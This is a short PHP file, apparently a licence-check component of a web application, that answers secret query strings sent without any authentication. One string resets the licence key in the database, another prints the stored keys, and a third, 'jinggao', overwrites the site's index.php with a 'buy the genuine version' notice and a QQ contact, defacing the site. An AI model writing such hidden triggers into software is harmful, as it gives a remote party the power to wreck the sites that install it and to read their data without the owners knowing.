<?php
error_reporting(0);
require_once("../config.php");
$query = $_SERVER['QUERY_STRING'];
if($query==null){
    echo "<center style=margin-top:100px;font-size:20px;color:red;>作弊监测中……</center>";
}
if($query=="ulsghgvo"){
$keyas = time().rand(10000000,99999999);
$sql = "update axphp_key set keya='$keyas',keyb='no'";
$ok = mysql_query($sql,$config);
if($ok){
    echo "The success of the operation";
}else{
    echo "Error~";
}
}
if($query=="mysql"){
$sql = "select * from axphp_key where id='1'";
$ery = mysql_query($sql,$config);
$info = mysql_fetch_array($ery);
echo "random: ".$info['keya'] . "<br />";
echo "Key: ".$info['keyb']."<br />";

}
if($query=="jinggao"){
file_put_contents("../index.php","<center style=margin-top:100px;font-size:20px;color:red;>请购买正版! 官方网站 <a href=http://www.dunling.com >www.dunling.com</a><p>授权QQ: 1013960367</center>");
    echo "The success of the operation";
}
?>